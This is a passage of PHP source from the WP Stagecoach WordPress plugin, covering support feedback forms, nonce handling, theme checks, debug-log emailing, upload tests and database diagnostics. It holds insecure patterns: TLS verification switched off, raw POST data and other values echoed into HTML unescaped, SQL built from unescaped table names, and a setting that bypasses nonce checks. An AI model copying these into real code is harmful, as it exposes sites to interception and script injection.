	if( strstr ($location, 'create' )  ){
		if ( empty( $message ) )
			$output .= __( 'Did the staging site creation work?', 'wpstagecoach' ) .PHP_EOL;
	} elseif( strstr( $location, 'import' )  ){
		$goto = 'action="'.admin_url('admin.php?page=wpstagecoach').'"';
		if ( empty( $message ) )
			$output .= __( 'Did the import work?', 'wpstagecoach' ) .PHP_EOL;
	}
	if( ! empty( $message ) ) {
		$output .= $message . PHP_EOL;
	}
	$output .= '</div>';	
	$output .= '<form id="wpsc-happiness-form" method="post">'.PHP_EOL;
	if( strstr($location, 'error') !== false ){
		if( empty($message) )
			$output .= '<p>' . __( 'Please describe the problem you encountered.', 'wpstagecoach' ) . '</p>' .PHP_EOL;
	} else {
		$output .= '  <input type="radio" name="worked" value="yes" id="yes" /><label for="yes">' . __( 'Yes, it was a smooth ride!', 'wpstagecoach' ) . '</label><br/>'.PHP_EOL;
		$output .= '  <input type="radio" name="worked" value="no" id="no" /><label for="no">' . __( 'No, I ran into problems.', 'wpstagecoach' ) . '</label><br/>'.PHP_EOL;
		$output .= '<label id="comment_yes">' . __( 'Comments:', 'wpstagecoach' ) . '</label>'.PHP_EOL;
		$output .= '<label id="comment_no" style="display:none;">' . __( 'What did not work:', 'wpstagecoach' ) . '</label><br/>'.PHP_EOL;
	}
	$output .= '  <textarea cols=60 rows=3 name="comments" id="comments" />';
	if( $location == 'error' )
		$output .= 'debug info: The SQL file is ' . wpsc_size_suffix( filesize( WPSTAGECOACH_DB_FILE ) ) . ' in size, and the tar file is ' . wpsc_size_suffix( filesize( WPSTAGECOACH_TAR_FILE ) ) . ' in size.';
	$output .= '</textarea><br/><span class="comments-error wpstagecoach-error" style="display:none;">' . __( 'Please let us know what did not work as expected.', 'wpstagecoach' ) . '</span><br />'.PHP_EOL;

	$post_fields = array(
		'wpsc-type' => $location,
		'wpsc-stage-site' => $site_info['wpsc-stage'],
		'wpsc-live-site' => $site_info['wpsc-live'],
		'wpsc-user' => $site_info['wpsc-user'],
		'wpsc-key' => $site_info['wpsc-key'],
		'wpsc-dest' => $site_info['wpsc-dest'],
		'wpsc-step' => $site_info['wpsc-step'],
		'wpsc-post' => json_encode( $_POST ),
		'wpsc-wpver' => get_bloginfo('version'),
		'wpsc-serverinfo' => base64_encode(json_encode( $_SERVER )),
		'wpsc-phpinfo' => base64_encode(json_encode( ini_get_all() )),
		'wpsc-plugins' => base64_encode(json_encode(get_option('active_plugins'))),
		'wpsc-ver' => WPSTAGECOACH_VERSION,
	);
	if( function_exists('phpversion') )
		$post_fields['wpsc-phpver'] = phpversion();
	if( stripos($_SERVER['SERVER_SOFTWARE'], 'apache') !== false  && function_exists('apache_get_version'))
		$post_fields['wpsc-apache-ver'] = apache_get_version();

	foreach ($post_fields as $key => $value) {
		$output .= '  <input type="hidden" name="'.$key.'" value="'.$value.'"/>'.PHP_EOL;
	}
	add_filter( 'nonce_life', 'wpstagecoach_feedback_nonce_time' );
	$output .= '<input type="hidden" name="wpstagecoach-feedback-nonce" value="' . wp_create_nonce( 'wpstagecoach-feedback-nonce' ) . '">';
	$output .= '<a class="button submit-button" id="submit-feedback">' . __( 'Submit feedback', 'wpstagecoach' ) . '</a>'.PHP_EOL;
	$output .= '</form></div>'.PHP_EOL;
	$output .= '<div id="feedback-result"></div>';

	return $output;
}

function wpsc_display_sftp_login($stage_site, $live_site){
	/*********************************************************************************
	*	displays the SFTP login information, including the iframe that comes from https://wpstagecoach.com
	*	requires
	*		stage_site
	*		live_site
	*	return value:
	*		none
	*********************************************************************************/
	global $wpsc;

	$url = WPSTAGECOACH_CONDUCTOR.'/wpsc-user-pass.php?wpsc-user='.$wpsc['username'].'&wpsc-key='.$wpsc['apikey'].'&wpsc-ver='.WPSTAGECOACH_VERSION.'&wpsc-live-site='.$live_site . '&wpsc-stage-site=' . $stage_site;
	$msg = 
		'<div class="wpsc-login-creds">
			<p>' . __( '<b>SFTP/FTP</b> login credentials for the staging site:', 'wpstagecoach' ) . '<br />
			<iframe style="margin-top:-9px; margin-bottom:-9px;" height=81px src="' . $url . '">'
			. __( 'Please log into your <a href="https://wpstagecoach.com/your-account" target="_blank">WPStagecoach.com account</a> for your login details.' ) . '
			</iframe></p>
			<p><b>' . __( 'Your WordPress login credentials are the same as on your live site.', 'wpstagecoach' ) . '</b></p>
		</div>';

	echo $msg;
}


function wpsc_set_step_nonce( $type, $nextstep='' ){
	/*********************************************************************************
	*	sets a nonce for our stepping forms
	*	requires
	*		$type -- what step-form we're on (create/import/check)
	*		$nextstep -- the next step we're going to
	*	return value:
	*		the nonce string to put in $_POST
	*********************************************************************************/
	if( empty( $nextstep ) ){
		$nextstep = 0;
	}
	$wpsc = get_option( 'wpstagecoach' );
	if( isset( $wpsc['disable-step-nonce'] ) && $wpsc['disable-step-nonce'] == true ){
		if( WPSC_DEBUG ){
			echo '<p>' . __( 'Skipping the nonce checks', 'wpstagecoach' ) . '</p>';
		}
		return 'none';
	}
	// set WP Stagecoach's nonces to be shorter than normal
	add_filter( 'nonce_life', 'wpstagecoach_step_nonce_time' );
	$wpsc_nonce_name = 'wpstagecoach-' . $type;
	$wpsc_nonce = $nextstep . '_' . wp_create_nonce( $wpsc_nonce_name );
	return $wpsc_nonce;
}

function wpsc_check_step_nonce( $type, $wpsc_nonce, $step='' ){
	/*********************************************************************************
	*	sets a nonce for our stepping forms
	*	requires
	*		$type -- what step-form we're on (create/import/check)
	*		$wpsc_nonce -- the string we received from $_POST
	*		$nextstep -- the next step we're going to
	*	return value:
	*		true/false (true it is good, false it doesn't match)
	*********************************************************************************/
	if( empty( $step ) ){
		$step = 0;
	}
	$wpsc = get_option( 'wpstagecoach' );
	if( isset( $wpsc['disable-step-nonce'] ) && $wpsc['disable-step-nonce'] == true ){
		if( WPSC_DEBUG ){
			echo '<p>' . __( 'Skipping the nonce checks', 'wpstagecoach' ) . '</p>';
		}
		return true;
	}
	// set WP Stagecoach's nonces to be shorter than normal
	add_filter( 'nonce_life', 'wpstagecoach_step_nonce_time' );
	$wpsc_nonce_name = 'wpstagecoach-' . $type;
	$wpsc_nonce_arr = explode( '_', $wpsc_nonce );
	$nonce_result = wp_verify_nonce( $wpsc_nonce_arr[1], $wpsc_nonce_name );

	if( $nonce_result !== false ){
		return true;
	} else {
		$errmsg = __( "Whoa there partner!  I don't recognize you--did we just take our last step together?", 'wpstagecoach' );
		if( 1 ){
			$errmsg .= '<br/>More info:<br/>We got mis-matched values for what we use to keep track of these steps.<br/>' . PHP_EOL;
			$errmsg .= 'We got this when we verified our nonce: "' . $nonce_result . '".<br/>' . PHP_EOL;
			$errmsg .= 'Here is what our POST data is: <pre>' . print_r( $_POST, true ) . '</pre><br/>' . PHP_EOL;
			$errmsg .= 'If this error persists, please see our <a href="https://wpstagecoach.com/question/did-we-just-take-our-last-step-together/" rel="no-follow" target="_blank">FAQ about it</a>.' . PHP_EOL;
		}
		wpsc_display_error( $errmsg );
		die();
	}
}


function wpsc_theme_check( ){
	/*********************************************************************************
	*	Checks the current theme name to see if it is on a list of themes with known incompatibilities
	*	requires
	*		none
	*	return value:
	*		true if the theme is good to go!
	*		false if the theme is on the known incompatibility list.
	*********************************************************************************/

	global $wpsc;
	if( !is_array( $wpsc ) ){
		$wpsc = get_option( 'wpstagecoach' );
	}

	// check if we are using a framework theme with known problems
	$post_url = WPSTAGECOACH_CONDUCTOR.'/wpsc-theme-check.php';
	$post_details = array(
		'wpsc-user'			=> $wpsc['username'],
		'wpsc-key'			=> $wpsc['apikey'],
		'wpsc-ver'			=> WPSTAGECOACH_VERSION,
		'wpsc-live-site'	=> rtrim( '/', preg_replace( '#https?://#', '', site_url() ) ),
	);

	$post_args = array(
		'timeout' => 120,
		'httpversion' => '1.1',
		'body' => $post_details
	);

	// do some SSL sanity
	global $wpsc_sanity;

	if( !isset($wpsc_sanity['https']) ){
		$wpsc_sanity['https'] = wpsc_ssl_connection_test();
	}
	if( $wpsc_sanity['https'] == 'NO_CA' ){
	 	$post_args['sslverify'] = false;
	} elseif( $wpsc_sanity['https'] == 'NO_CURL' ) {
		add_filter('use_curl_transport', '__return_false');
	}

	$post_result = wp_remote_post( $post_url, $post_args );
	$result = wpsc_check_post_info('special_dirs', $post_url, $post_details, $post_result) ; // we got a bad response from the server...


	if( $result['result'] != 'OK' || !is_array( $result['info'] ) ){
		wpsc_display_error($result['info']);
	} else {
		$cur_theme = get_option('current_theme');
		foreach ($result['info']['themes'] as $theme) {
			if( stripos( $cur_theme, $theme ) !== false ){
				$wpsc['warn_theme'] = true;
				update_option( 'wpstagecoach', $wpsc );
				return false;
			}
		}
	}
	if( isset( $wpsc['ignore_theme_warning'] ) ){
		unset( $wpsc['ignore_theme_warning'] );
		$updated = true;
	}
	if( isset( $wpsc['warn_theme'] ) ){
		unset( $wpsc['warn_theme'] );
		$updated = true;
	}
	if( isset( $updated ) && $updated == true ){
		update_option( 'wpstagecoach', $wpsc );
	}
	return true;
}

function wpsc_check_staging_theme_compatibility() {
	/*********************************************************************************
	*	Checks the current theme name to see if it is on a list of themes with known incompatibilities
	*	requires
	*		none
	*	
	*********************************************************************************/

	global $wpstagecoach_site_domain;
	// only do this on staging sites
	if( $wpstagecoach_site_domain == 'wpstagecoach.com' ){
		global $wpsc;

		// check if we are using a framework theme with known problems
		$post_url = WPSTAGECOACH_CONDUCTOR.'/wpsc-theme-check.php';
		$post_details = array(
			'wpsc-user'			=> $wpsc['username'],
			'wpsc-key'			=> $wpsc['apikey'],
			'wpsc-ver'			=> WPSTAGECOACH_VERSION,
			'wpsc-live-site'	=> rtrim( '/', preg_replace( '#https?://#', '', site_url() ) ),
		);


		$post_args = array(
			'timeout' => 120,
			'httpversion' => '1.1',
			'body' => $post_details
		);

		$wpsc_sanity = wpsc_sanity_check();
		// do some SSL sanity
		if( !isset($wpsc_sanity['https']) ){
			$wpsc_sanity['https'] = wpsc_ssl_connection_test();
		}
		if( $wpsc_sanity['https'] == 'NO_CA' ){
		 	$post_args['sslverify'] = false;
		} elseif( $wpsc_sanity['https'] == 'NO_CURL' ) {
			add_filter('use_curl_transport', '__return_false');
		}

		$post_result = wp_remote_post( $post_url, $post_args );
		$result = wpsc_check_post_info('special_dirs', $post_url, $post_details, $post_result ) ; // we got a bad response from the server...

		if( $result['result'] == 'OK' && is_array( $result['info'] ) ){
			global $wpdb;
			$cur_theme = get_option('current_theme');
			foreach ($result['info']['themes'] as $theme) {
				if( stripos( $cur_theme, $theme ) !== false ){
					add_action( 'admin_notices', 'wpsc_theme_warning' );
				}
			}

		}
	}
}


function wpsc_theme_warning() {
	/*************************************************************************
	*	displays the warning about reported themes if it hasn't been hidden
	*************************************************************************/
	global $wpsc;
	if( !is_array( $wpsc ) ){
		$wpsc = get_option( 'wpstagecoach' );
	}
	/* Check that the user hasn't already clicked to ignore the message */
	if ( true == $wpsc['warn_theme'] && !isset( $wpsc['ignore_theme_warning'] ) ) {
		if( strpos( $_SERVER['REQUEST_URI'], '?' ) !== false ){
			$hide_url = $_SERVER['REQUEST_URI'] . '&wpsc_ignore_theme_warning=yes';
		} else{
			$hide_url = $_SERVER['REQUEST_URI'] . '?wpsc_ignore_theme_warning=yes';
		}
		$cur_theme = get_option('current_theme');
		echo 
		'<div id="message" class="error">
			<p>' . sprintf( __( 'Some users of your theme, %s, have reported problems doing automatic imports with WP Stagecoach.  ', 'wpstagecoach' ), $cur_theme ) . 
			__( 'You may need to do a manual import instead of an automatic import.  ', 'wpstagecoach' ) . 
			'<a href="https://wpstagecoach.com/question/isnt-theme-compatible-wp-stagecoach/" target="_blank">' . __( 'More information about incompatible themes', 'wpstagecoach' ) .
		'</a></p>
		<p>' .
			sprintf( __( '<a href="%1$s">Hide this message</a>', 'wpstagecoach' ), $hide_url )
		. '</p>
		</div>';
	}
}

function wpsc_ignore_theme_warning() {
	/**********************************************
	*	hides the warning about reported themes 
	**********************************************/
	global $wpsc;
	if( !is_array( $wpsc ) ){
		$wpsc = get_option( 'wpstagecoach' );
	}

	/* If user clicks to ignore the notice, add that to their user meta */
	if ( isset( $_GET['wpsc_ignore_theme_warning'] ) && 'yes' == $_GET['wpsc_ignore_theme_warning'] ) {
		$wpsc['ignore_theme_warning'] = true;
		update_option( 'wpstagecoach', $wpsc );
	}
}

function wpsc_debug_display_debug_logs( $debug_nonce ) {
	/**
	 *	offer to send WP Stagecoach support the create debug files
	 */

	echo '<div>';
	echo '<strong>If WP Stagecoach support asks you to send them debug files, select the appropriate ones and click the Send Files button.</strong>';
	echo '<form method="POST" id="wpsc-debug" >'.PHP_EOL;
	$files[] = WPSTAGECOACH_TEMP_DIR . 'create_debug.log';
	if( file_exists( WPSTAGECOACH_TEMP_DIR . 'create_debug.log.old' ) ){
		$files[] = WPSTAGECOACH_TEMP_DIR . 'create_debug.log.old';
	}

	foreach ( $files as $file ) {
		$filename = explode( '/', $file );
		$filename = array_pop( $filename );
		echo '<input type="checkbox" id="files[' . base64_encode( $filename ) . ']" name="files[' . base64_encode( $filename ) . ']" /><label for="files[' . base64_encode( $filename ) . ']">' . $filename . '</label><br/>' . PHP_EOL;
	}
	echo '<input type="hidden" name="wpsc-debug-nonce" value="' . $debug_nonce . '" />' . PHP_EOL;
	echo '<input type="submit" class="button button-submit" name="wpsc-send-logfiles" value="' . __( 'Send Files', 'wpstagecoach' ) . '" />' . PHP_EOL;
	echo '</form><br/>' . PHP_EOL;
	echo '</div>' . PHP_EOL;

}

function wpsc_debug_send_debug_logs() {
	/**
	 *	 send WP Stagecoach support the create debug log files
	 */
	if ( ! wp_verify_nonce( $_POST['wpsc-debug-nonce'], 'wpstagecoach-debug' ) ) {
		echo __( 'Invalid security step - please try again.', 'wpstagecoach' ); 
		return;
	}

	$wpsc = get_option( 'wpstagecoach' );
	// check if they selected something
	if( ! isset( $_POST['files'] ) || ! is_array( $_POST['files'] ) ) {
		echo __( 'You must select at least one file to send.', 'wpstagecoach' );
		return;
	}
	// if so, then for each file they selected, we gzip it and email and then remove the gzip file.
	foreach ( $_POST['files'] as $filename => $on ) {
		$filename = base64_decode( $filename );
		$file = WPSTAGECOACH_TEMP_DIR . $filename;
		if( file_exists( $file ) && is_readable( $file ) ){
			$gzfile = gzCompressLogFile( $file );
			if( $gzfile ){
				$subj = 'debug log file for user ' . $wpsc['username'] . ' on site ' . site_url();
				$res = wp_mail( 'support@wpstagecoach.com', $subj, $subj . PHP_EOL . $filename, '', $gzfile );
				unlink( $gzfile );
				if( ! $res ){
					echo WPSTAGECOACH_ERRDIV . sprintf(  __( 'The email for file "%s" did not send correctly - you may need to FTP into your site and retrieve it and send to WP Stagecoach support', 'wpstagecoach' ) . '<br/>', $filename );
					echo __( 'It is located here: ', 'wpstagecoach' ) . WPSTAGECOACH_TEMP_DIR . '</div>';
				} else {
					echo sprintf( '<p>' . __( 'Great, it looks like we were able to send the %s file.', 'wpstagecoach' ) . '</p>' . PHP_EOL, $filename );
				}
			}
		}
	}

	if( file_exists( WPSTAGECOACH_TEMP_DIR . 'create_debug.log.old' ) ){
	}
}

function gzCompressLogFile( $source, $level = 9 ){ 
	/**
	 * GZIPs the log file on disk (appending .gz to the name)
	 * Based on: http://stackoverflow.com/questions/6073397/how-do-you-create-a-gz-file-using-php
	 * 
	 * @param string $source Path to file that should be compressed
	 * @param integer $level GZIP compression level (default: 9)
	 * @return string New filename (with .gz appended) if success, or false if operation fails
	 */

    $dest = $source . '.gz'; 
    $mode = 'wb' . $level; 
    $error = false; 
    if ($fp_out = gzopen($dest, $mode)) { 
        if ($fp_in = fopen($source,'rb')) { 
            while (!feof($fp_in)) 
                gzwrite($fp_out, fread($fp_in, 1024 * 512)); 
            fclose($fp_in); 
        } else {
            $error = true; 
        }
        gzclose($fp_out); 
    } else {
        $error = true; 
    }
    if ($error)
        return false; 
    else
        return $dest; 
} 

function wpsc_debug_show_changes() {
	/************************************************************
	*	shows all the retrieved changes stored in the database 
	************************************************************/
	if( $retr_changes = get_option('wpstagecoach_retrieved_changes') ){
		_e( '<h4>Displaying absolutely all the changes retrieved from your staging site</h4>', 'wpstagecoach' );
		echo str_pad( '', 65536 ) . PHP_EOL;
		ob_flush();
		flush();

		echo '<div>';
		echo '<pre>';
		foreach ($retr_changes as $type => $sub_array) {
			echo '<ul class="wpstagecoach-indented-list">' . PHP_EOL;
			echo '[' . $type . '] ('.sizeof($sub_array).')'.PHP_EOL;

			if( is_array( $sub_array ) ){
				foreach ($sub_array as $subtype => $subsub_array) {
					if( is_array( $subsub_array ) ){
						echo '<li>['.$subtype.'] ('.sizeof($subsub_array) . ')</li>' . PHP_EOL;
						echo '<ul class="wpstagecoach-indented-list">' ;
						foreach ($subsub_array as $num => $line) {
							echo '<li>[' . $num . '] => ' . esc_html($line) . ')</li>' . PHP_EOL;
						}
						echo '</ul>' . PHP_EOL;
					} else {
						echo '<li>[' . $num . '] => ' . esc_html($line) . ')</li>' . PHP_EOL;

					}

				}
			}
			echo '</ul>' ;
		}
		echo '</pre>';	
		echo '</div>';	
	} else {
		_e('No changes have been stored.', 'wpstagecoach' );
	}
}

function wpsc_debug_show_dir_sizes() {
	/*************************************************************
	*	checks the size of all the files in the root directory 
	*************************************************************/
	$dirs = array();
	$files = array();
	chdir( get_home_path() );
	foreach ( scandir( '.' ) as $file ) {
		if( $file != '.' && $file != '..' ){
			if( is_dir( $file ) && !is_link( $file ) ){
				$dirs[ $file ] = wpsc_get_dir_size( $file );
			} else {
				$files[ $file ] = filesize( $file );
			}
		}
	}

	arsort( $dirs );
	foreach ($dirs as $dir => $size) {
		echo '[dir]' . $dir . ' (' . wpsc_size_suffix( $size ) . ')<br/>';
	}
	echo '<br/>';
	arsort( $files );
	foreach ($files as $file => $size) {
		echo $file . ' (' . wpsc_size_suffix( $size ) . ')<br/>';
	}
}

function wpsc_debug_test_upload() {
	/**************************************************************************************
	*	tests the speed of the connection from your server to a WP Stagecoach workhorse   *
	**************************************************************************************/
	$workhorse_ip = gethostbyname( 'workhorses.wpstagecoach.com' );
	$workhorse = gethostbyaddr( $workhorse_ip );
	$shortname = explode( '.', $workhorse );
	$shortname = array_shift( $shortname );

	if( function_exists( 'microtime' ) ){
		$file_start_time = microtime( true );
	} else {
		$file_start_time = date( 'U' );
	}
	$upload_filename = WPSTAGECOACH_TEMP_DIR . 'upload_test';
	$chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$charlen = strlen( $chars );

	$fpupld = fopen( $upload_filename, 'w' );
	for( $i = 0; $i < 256; $i++ ) {
		$random_upload_test = '';
		for( $j = 0; $j < 32768; $j++ ) {
			$random_upload_test .= $chars[ rand( 0, $charlen - 1 ) ];
		}
		fwrite( $fpupld, $random_upload_test );
	}

	fclose( $fpupld );
	$filesize = filesize( $upload_filename );

	if( function_exists( 'microtime' ) ){
		$file_end_time = microtime( true );
	} else {
		$file_end_time = date( 'U' );
	}
	echo 'Time to create file: ' . number_format( $file_end_time - $file_start_time, 2 ) . 's<br/>';
	echo 'File size: ' .  wpsc_size_suffix( $filesize ) . '<br/>';


	// do some SSL sanity
	if( !isset($wpsc_sanity['https']) ){
		$wpsc_sanity['https'] = wpsc_ssl_connection_test();
	}
	if( $wpsc_sanity['https'] == 'NO_CA' ){
	 	$post_args['sslverify'] = false;
	} elseif( $wpsc_sanity['https'] == 'NO_CURL' ) {
		add_filter('use_curl_transport', '__return_false');
	}

	$upload_test_url = 'https://' . $workhorse . '/wpsc-file-recieve.php';
	if( $wpsc_sanity['https'] == 'ALL_GOOD' || $wpsc_sanity['https'] == 'NO_CA' ){

		echo 'Using cURL<br/>';
		// we can use curl to upload things
		if( version_compare( PHP_VERSION, '5.5.0', '>=' ) ){
			$post_details['file'] = new CURLFile( $upload_filename );
		} else {
			$post_details['file'] = '@'.$upload_filename;
		}


		$ch=curl_init();
		curl_setopt( $ch, CURLOPT_URL,				$upload_test_url );
		curl_setopt( $ch, CURLOPT_POST,				1 );
		curl_setopt( $ch, CURLOPT_POSTFIELDS,		$post_details );
		curl_setopt( $ch, CURLOPT_TIMEOUT,			600 );
		curl_setopt( $ch, CURLOPT_RETURNTRANSFER,	1 );


		if( $wpsc_sanity['https'] == 'NO_CA' ){
			curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
			curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
		}

		$result = curl_exec( $ch );

	} else {

		echo 'Using wp_remote_get<br/>';
		add_filter('use_curl_transport', '__return_false');
		$headers = array(
			'content-type' => 'application/binary', // Set content type to binary
		);

		$file = fopen( $upload_filename, 'r' );
		$wp_result = wp_remote_get( $upload_test_url , array('headers' => $headers, 'timeout' => 120, 'body' => fread($file, $filesize) ) );
		fclose( $file );

		$result = $wp_result['body'];
	}

	if( function_exists( 'microtime' ) ){
		$upload_end_time = microtime( true );
	} else {
		$upload_end_time = date( 'U' );
	}

	unlink( $upload_filename );


	if( 'OK' != $result ){
		echo __( 'Unexpected result:', 'wpstagecoach' ) . '<pre>';
		var_dump( $result ) ;
		echo '</pre>';
		echo __( 'Please try again, and if it is still not working, please contact WP Stagecoach support with your server\'s IP address.', 'wpstagecoach' ) . '<br/>';
		echo sprintf( __( 'Information: Date: %s. We tried connecting to the workhorse %s.', 'wpstagecoach' ), date( 'Y-M-d H:i:s e' ), $shortname ) . '<br/>';
	} else{ 
		echo sprintf( __( 'Great, we were able to connect to the workhorse %s and upload a test file.', 'wpstagecoach' ), $shortname ) . '<br/>';
		echo __( 'Time to upload file: ', 'wpstagecoach' ) . number_format( $upload_end_time - $file_end_time, 2 ) . '<br/>';
		echo __( 'upload rate: ', 'wpstagecoach' ) . wpsc_size_suffix(  $filesize / ( $upload_end_time - $file_end_time ) ) . '/s<br/>';
		echo __( 'Date: ', 'wpstagecoach' ) . date( 'Y-M-d H:i:s e' ) . '<br/>';
	}
}

function wpsc_debug_show_database_info() {
	/****************************************************************************
	*	displays the size, tables and number of rows per table for the database
	****************************************************************************/

	$DB_HOST = explode(':', DB_HOST);
	if(isset($DB_HOST[1]) ){
		if( ctype_digit( $DB_HOST[1] ) ){ // it is only digits, therefore, hopefully it is a port
			$db = mysqli_connect($DB_HOST[0], DB_USER, DB_PASSWORD, DB_NAME, $DB_HOST[1]); // these are defined in wp-config.php
		} else { // it has alpha characters, so it is likely a socket.
			$db = mysqli_connect($DB_HOST[0], DB_USER, DB_PASSWORD, DB_NAME, NULL, $DB_HOST[1]); // these are defined in wp-config.php
		}
	} else {
		$db = mysqli_connect($DB_HOST[0], DB_USER, DB_PASSWORD, DB_NAME); // these are defined in wp-config.php
	}

	if( mysqli_errno($db) ) {
		$errmsg = __( 'Couldn\'t connect to database', 'wpstagecoach' ) . DB_NAME . __( 'on host', 'wpstagecoach' ) . DB_HOST . __( '. This should never happen.  Error: ', 'wpstagecoach' ) . mysqli_connect_error();
		wpsc_display_error( $errmsg );
		return;
	}

	if (!mysqli_set_charset($db, DB_CHARSET)) {
		$errmsg  = '<p>' . __( 'Error loading character set: ', 'wpstagecoach' ) . DB_CHARSET . ': ' . mysqli_error( $db ) . '</p><p>';
		$errmsg .= '<p>' . __( 'Please determine what character set your database uses and contact <a href="https://wpstagecoach.com/support" target="_blank">WP Stagecoach support</a>', 'wpstagecoach' ) . '</p>';
		wpsc_display_error( $errmsg );
		return;
	}

	$db_size_query = 'SELECT sum( data_length + index_length ) FROM information_schema.TABLES where table_schema="' . DB_NAME . '";';
	$res = mysqli_query($db, $db_size_query);
	$db_size = array_shift(mysqli_fetch_row($res));
	mysqli_free_result($res);

	echo __( 'Database size: ', 'wpstagecoach' ) . wpsc_size_suffix( $db_size ) . '<br/>';

	echo str_pad( '', 65536 ) . PHP_EOL;
	ob_flush();
	flush();


	// get array of tables
	$res = mysqli_query($db, 'SHOW FULL TABLES;');
	while( $row = mysqli_fetch_row($res) ){
		$tables[$row[0]] = $row[1];
	}
	mysqli_free_result($res);

	$errmsg = '';
	$output = '<table><th align="left">Table Name</th><th align="left"># of rows</th>';

	foreach ($tables as $table => $table_type) {
		$query = 'select count(*) from '.$table.';';
		$res = mysqli_query($db, $query);
		$result = mysqli_fetch_row($res);
		if( is_array($result) ){
			$num_rows = array_shift( $result );
		} else {
			$errmsg = '<p>' . __( 'Warning: could not count rows in "' . $table . '". bad result.', 'wpstagecoach' ) . '</p>';
			if( ! empty( $result ) ){
				$errmsg .= 'result: "<pre>' . print_r( $result, true ) . '</pre>"';
			}
			if( ! empty( $db->error ) ){
				$errmsg .= '<br/>Error: <pre>' . $db->error . '</pre>';
			}
			$num_rows = '(NA)';
		}
		$output .= '<tr><td>' . $table . '</td><td>' . $num_rows . '</td>' . PHP_EOL;

	}
	$output .= '</table>';

	if( !empty( $errmsg ) ){
		wpsc_display_error( $errmsg );
		echo str_pad( '', 65536 ) . PHP_EOL;
		ob_flush();
		flush();
		sleep(1);
	}


	echo $output;

}

function wpsc_debug_check_checksums() {
	/*************************************************************
	*	checks the size of all the files in the root directory 
	*************************************************************/
	_e( '<h4>Checking the integrity of your plugin files</h4>', 'wpstagecoach' );
	echo str_pad( '', 65536 ) . PHP_EOL;
	ob_flush();
	flush();
	$wpsc = get_option( 'wpstagecoach' );
	$post_url = WPSTAGECOACH_CONDUCTOR.'/wpsc-plugin-chksum.php';
	$post_details = array(
		'wpsc-user'	=> $wpsc['username'],
		'wpsc-key'	=> $wpsc['apikey'],
		'wpsc-ver'	=> WPSTAGECOACH_VERSION,
		'site'		=> preg_replace('#https?://#', '',rtrim(site_url(),'/') ),
	);

	$post_args = array(
		'timeout' => 120,
		'body' => $post_details
	);

	// do some SSL sanity
	if( !isset($wpsc_sanity['https']) ){
		$wpsc_sanity['https'] = wpsc_ssl_connection_test();
	}
	if( $wpsc_sanity['https'] == 'NO_CA' ){
	 	$post_args['sslverify'] = false;
	} elseif( $wpsc_sanity['https'] == 'NO_CURL' ) {
		add_filter('use_curl_transport', '__return_false');
	}


	$post_result = wp_remote_post($post_url, $post_args );
	$result = wpsc_check_post_info('plugin_chksum', $post_url, $_POST, $post_result ) ; // check response from the server

	if( $result['result'] == 'OK' ){
		$chksum_errors = '';
		foreach ($result['info'] as $file => $chksum) {
			$mychksum = md5_file( dirname( __FILE__ ) . '/../' . $file ); // we're in the includes/ dir now
			if( $mychksum != $chksum ){
				$chksum_errors .= __('The checksum for the file ', 'wpstagecoach' ) . '<b>' . $file . '</b>' . __(' does not match what is in the official plugin at WP Stagecoach.</br>', 'wpstagecoach' );
			}
		}

		if( !empty($chksum_errors) ){
			wpsc_display_error( $chksum_errors );
			$errmsg = __('Please try to download a new version of the plugin if you are experiencing problems.', 'wpstagecoach' );
			wpsc_display_error( $errmsg );
		} else {
			echo '<div class="wpstagecoach-info">'.  __( 'Great! All the files\' checksums in your plugin match the official ones!', 'wpstagecoach' ) . '</div>'.PHP_EOL;
		}
	} else {
		$errmsg  = __( 'We could not retrieve the checksum information for this plugin.', 'wpstagecoach' );
		wpsc_display_error( $errmsg );
	}	
}

function wpsc_advanced_display_create_skip_directories_form() {
	/*********************************************************************************
	*	Lets user specify a custom number of iterations for database file creation   *
	*********************************************************************************/
	global $wpsc;
	$update_wpsc = false;

	echo '<div id="wpstagecoach-advanced-create-skip-directories-form" ' . ( isset( $wpsc['advanced-create-skip-directories'] ) ? '>' : 'style="display:none;">' );

	if( isset( $_POST['wpsc-advanced-create-skip-directories'] ) ){
		if( isset( $_POST['wpsc-advanced-create-skip-directories-list'] ) && !empty( $_POST['wpsc-advanced-create-skip-directories-list'] ) ){
			$update_wpsc = true;
			$dir_list = explode( PHP_EOL, $_POST['wpsc-advanced-create-skip-directories-list'] );
			chdir( get_home_path() );

			foreach ($dir_list as $key => $dir) {
				$dir = trim( $dir, " \t\n\r\0\x0B/" );
				$dir = ltrim( $dir, "./" );
				if( empty( $dir ) ){
					unset( $dir_list[ $key ] );
				} else {
					$dir_list[ $key ] = $dir;

					if( !is_dir( $dir ) ){
						$errmsg = sprintf( __( 'We can\'t seem to find the directory you specified: "%s".<br/>We\'re going to stop here - please check your entires and try again.<br/>', 'wpstagecoach' ), $dir );
						wpsc_display_error( $errmsg );
						$update_wpsc = false;
						break;
					}
				}
			} // end foreach over $dir_list

			$dir_list = array_unique( $dir_list );
			if( $update_wpsc ){  // don't want to update $wpsc if we got a bad directory above
				$wpsc['advanced-create-skip-directories-list'] = implode( PHP_EOL, $dir_list );
			}

		} elseif( isset( $wpsc['advanced-create-skip-directories-list'] ) && empty( $_POST['wpsc-advanced-create-skip-directories-list'] ) ) {
			unset( $wpsc['advanced-create-skip-directories-list'] );
			$update_wpsc = true;
		}
	}
	
	if( $update_wpsc && update_option( 'wpstagecoach', $wpsc ) !== false ) {
		_e( '<p>List of directories to skip updated.</p>', 'wpstagecoach' );
	}

	echo '<div class="wpstagecoach-warn">' . __( 'You probably shouldn\'t specify any directories to skip unless you know what you are doing have been told to change them by WP Stagecoach support.', 'wpstagecoach' ) . '</div>' . PHP_EOL;

	echo '<label for="wpsc-advanced-create-skip-directories-list" />Specify directories to skip, one per line, starting from the site\'s top level (where the wp-admin/ directory is).</label>';
	echo '<textarea cols=80 rows=4 placeholder="eg: wp-content/uploads/2014" id="wpsc-advanced-create-skip-directories-list" name="wpsc-advanced-create-skip-directories-list">' . PHP_EOL;
	if( isset( $wpsc['advanced-create-skip-directories-list'] ) ){
		echo $wpsc['advanced-create-skip-directories-list'] ;
	}
	echo '</textarea>' . PHP_EOL;

	echo '</div>' . PHP_EOL;
}


function wpsc_advanced_display_create_mysql_rows_per_step() {
	/*******************************************************************************************
	*	Lets user specify a custom number of rows dumped per step for database file creation   *
	*******************************************************************************************/
	global $wpsc;
